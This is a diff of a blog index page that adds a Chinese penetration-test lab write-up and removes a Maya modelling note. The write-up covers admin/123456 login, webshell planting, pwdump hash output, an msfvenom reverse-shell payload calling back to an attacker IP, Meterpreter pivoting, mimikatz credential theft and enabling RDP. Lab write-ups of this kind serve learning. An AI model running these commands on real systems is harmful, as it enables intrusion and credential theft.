@@ -173,6 +173,135 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-note/web/pentist-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/11/24/note/web/pentist-1/" class="article-date">
+  	<time datetime="2020-11-24T08:42:52.000Z" itemprop="datePublished">2020-11-24</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/24/note/web/pentist-1/">
+        靶机看答案渗透记录-1
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>nmap扫不到，但是可以ping通= =</p>
+<p>打开主页之后是phpstudy探针，按照官方文档关闭</p>
+<p>然后访问，是个目录遍历漏洞= =</p>
+<p>经过配置进入了主页</p>
+<h2 id="找到后台"><a href="#找到后台" class="headerlink" title="找到后台"></a>找到后台</h2><p>发现系统是yxcms的，询问雪殇知道可以下载yxcms的源码审计，然后发现后台入口</p>
+<p>尝试弱密码admin/123456可以登陆</p>
+<h2 id="后台操作"><a href="#后台操作" class="headerlink" title="后台操作"></a>后台操作</h2><ol>
+<li><p>有个sql执行可以执行某些操作</p>
+</li>
+<li><p>修改首页模板，index.php可以添加一句话木马， 使用weevely访问失败，但是可以使用 <a target="_blank" rel="noopener" href="https://doc.u0u.us/zh-hans/getting_started/get_antsword.html">AntSword</a> 访问</p>
+</li>
+<li><p>有个gethash的工具可以获取windows上面密码的hash值，但是没下到<br>网上找到一个渗透工具集，好家伙<del>白嫖真爽</del></p>
+<p>pwdump也可以获取hash，获取到了hash</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">liukaifeng01:1000:NO PASSWORD*********************:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>虽然找到了hash值，但是没有找到密码</p>
+</li>
+<li><p>开启了3306端口，可以尝试连接，但是连接失败，不允许连接</p>
+</li>
+<li><p>使用msf生成木马</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.117 lport=4444 -f exe -o /root/桌面/hakcer.exe</span><br></pre></td></tr></table></figure>
+
+<p>kali下可以使用msfpc简化</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfpc windows reverse eth1 4444</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>msf使用exploit/multi/handler模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LPORT 4444</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>上传生成的木马到靶机，执行，连接成功，执行sysinfo命令测试是否成功</p>
+</li>
+<li><p>run vnc进行桌面监控</p>
+</li>
+<li><p>run autoroute -s 192.168.52.1/24<br> 这条命令允许攻击机进入192.168.52.1/24子网</p>
+</li>
+<li><p>arp -a查看域控成员</p>
+</li>
+<li><p>使用background把当前session保存至后台</p>
+</li>
+<li><p>扫描远端IP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;portscan&#x2F;tcp</span><br><span class="line">set RHOSTS 192.168.52.141</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>开放了445端口，ms17_010漏洞，大佬说蓝屏，还没试</p>
+</li>
+<li><p>ms08_067攻击失败</p>
+</li>
+<li><p>再次连接win7，使用load mimikatz获得凭证</p>
+</li>
+<li><p>getsystem命令 sysinfo命令 ps命令</p>
+</li>
+<li><p>migrate命令，explorer为2872</p>
+</li>
+<li><p>之前load了mimikatz(kiwi)插件，然后执行creds_tspkg获取域控密码，新版本msf变了，遇事不决help</p>
+</li>
+<li><p>使用run post/windows/manage/enable_rdp开启windows的rdp远程桌面</p>
+</li>
+<li><p>linux使用rdesktop连接，windows直接使用远程桌面连接<br>用户名和密码为Administrator/hongrisec@2019</p>
+</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>知道系统相关信息之后可以下载相关源码进行审计发现漏洞。从而找到管理登陆页面，弱密码等</li>
+<li>pwdump可以获取windows的密码哈希值</li>
+<li>msfvenom可以生成木马，msfpc简化生成操作，木马连接到exploit/multi/handler</li>
+<li>run vnc用于监控桌面，远程桌面等</li>
+<li>run autoroute -s 192.168.52.1/24，这条命令允许攻击机进入192.168.52.1/24子网</li>
+<li>msf background把当前session保存至后台，sessions -l 列出所有session，sessions num切换至第num个session</li>
+<li>使用auxiliary/scanner/portscan/tcp扫描对应网段的主机</li>
+<li>mimikatz插件用于获取登陆凭证，插件已经被替换为kiwi，使用help获取相关用法</li>
+<li>使用run post/windows/manage/enable_rdp开启远程桌面</li>
+<li>Linux使用rdesktop,windows使用远程桌面连接远程桌面</li>
+<li>migrate命令进程迁移，让进程成为目标机器某个合法进程的子进程，比如说explorer.exe</li>
+</ol>
+<h2 id="两个漏洞"><a href="#两个漏洞" class="headerlink" title="两个漏洞"></a>两个漏洞</h2><ol>
+<li>msf17_010</li>
+<li>msf08_067<br>都使用了445端口<br>MS08-067漏洞原理分析及还原 - 乃逸夫的文章 - 知乎<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27155431">https://zhuanlan.zhihu.com/p/27155431</a></li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-writeup/kctf2020-10/wp" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -822,106 +951,6 @@
 <p>摄像机、灯光、脚本。。。</p>
 </li>
 </ol>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/3d/maya-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/11/04/note/3d/maya-1/" class="article-date">
-  	<time datetime="2020-11-04T10:14:26.000Z" itemprop="datePublished">2020-11-04</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/04/note/3d/maya-1/">
-        maya入门--maya建模方法和基本概念
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="maya建模方法"><a href="#maya建模方法" class="headerlink" title="maya建模方法"></a>maya建模方法</h2><ol>
-<li><p>NURBS建模</p>
-</li>
-<li><p>多边形建模</p>
-</li>
-<li><p>纹理置换建模</p>
-</li>
-<li><p>雕刻建模</p>
-</li>
-</ol>
-<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><a target="_blank" rel="noopener" href="https://www.douban.com/note/651075924/">https://www.douban.com/note/651075924/</a></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143041389">Maya的几种建模方法 - fashion游戏建模的文章 - 知乎</a></p>
-<h2 id="官方教程"><a href="#官方教程" class="headerlink" title="官方教程"></a>官方教程</h2><p>F11</p>
-<p>帮助-&gt; 教程</p>
-<p>基本操作视频教程 <a target="_blank" rel="noopener" href="https://knowledge.autodesk.com/search-result/caas/simplecontent/content/maya-1-minute-startup-movies.html">https://knowledge.autodesk.com/search-result/caas/simplecontent/content/maya-1-minute-startup-movies.html</a></p>
-<p>实例教程 <a target="_blank" rel="noopener" href="https://knowledge.autodesk.com/zh-hans/support/maya/learn-explore/caas/simplecontent/content/maya-tutorials.html">https://knowledge.autodesk.com/zh-hans/support/maya/learn-explore/caas/simplecontent/content/maya-tutorials.html</a></p>
-<p>zbrush</p>
-<p>官方文档 <a target="_blank" rel="noopener" href="http://docs.autodesk.com/MAYAUL/2015/CHS/GettingStarted/#!/url=./files/The_Maya_user_interface_The_Maya_interface.htm">http://docs.autodesk.com/MAYAUL/2015/CHS/GettingStarted/#!/url=./files/The_Maya_user_interface_The_Maya_interface.htm</a></p>
-<p>创建菜单的复选项是交互式创建</p>
-<p>Alt+鼠标 左=旋转视图 中=移动 右=缩放</p>
-<p>按6可以显示实体，按4显示线框，对应的是视图下面那一排，应该是工具栏？</p>
-<p>ViewCube控制显示角度 窗口 &gt; 设置/首选项 &gt; 首选项”(Window &gt; Settings/Preferences &gt; Preferences)）中打开“ViewCube”类别并确保“显示 ViewCube”(Show the ViewCube)。2019版似乎没有，使用旋转平移也行。</p>
-<p>着色-&gt;对所有项目进行平滑着色处理</p>
-<p>窗口-&gt;常规编辑器-&gt;Hyphergraph</p>
-<p>将对象转为模板可以防止意外选择</p>
-<p>材质与灯光照射有关</p>
-<h2 id="多边形建模"><a href="#多边形建模" class="headerlink" title="多边形建模"></a>多边形建模</h2><p>在 Maya 中，建模是指为 Maya 场景中的角色和对象创建虚拟的 3D 曲面。曲面对于创建有说服力的 3D 图像非常重要</p>
-<p>Maya中有两种曲面类型，多边形曲面和NURBS</p>
-<p>多边形曲面是由三个或更多边的平面（称为面）组成的网络，这些面连接在一起以创建多边形网格。多边形网格由顶点、面和边组成。</p>
-<p>网格上的线框线表示每个面的边。这些边围住的区域称为面。这些边彼此相交的位置是一个称为顶点的点的位置。 </p>
-<p>多边形可以轻松地表示平面以及曲线式 3D 形状</p>
-<p>可以使用所有 3D 曲面类型的最少量数据描述多边形曲面，所以性能好</p>
-<p>四视图下，左上左下右下依次为：俯视图，前视图，侧视图，每一个视图都有自己的面板菜单</p>
-<p>视图摄影机直接单击属性编辑器即可</p>
-<p>立方体基本体由称为“四边形”的四边多边形面构成。四边形多边形经常与 3D 角色模型一起使用，因为这些多边形在绑定到骨架时很容易进行平滑，并且变形得很好</p>
-<p>建模时可以删除一半，另一半使用对称完成</p>
-<p>双击工具可以显示设置</p>
-<p>网格工具-&gt;创建多边形工具</p>
-<p>桥接之前需要先合并，使用网格-&gt;结合工具</p>
-<p>切割：网格工具-&gt;多切割</p>
-<p>多边形建模满足四边形约束</p>
-<p>软化边：网格显示-&gt;软化边</p>
-<p>b键软选择，选择周围的点</p>
-<p>移动工具的反射=对称</p>
-<p>NURBS（非均匀有理 B 样条线）使用数学方法描述非常适合 3D 应用程序的曲线和曲面。NURBS 的特点是它们能够产生平滑的有机形状。</p>
-<p>可以使用多种方法快速对 NURBS 曲面进行建模和编辑。使用一条或多条 NURBS 曲线（定义了想要用于曲面的形状的轮廓）创建 NURBS 曲面，然后使用特定的构建方法创建完成的曲面。 </p>
 
       
     </div>
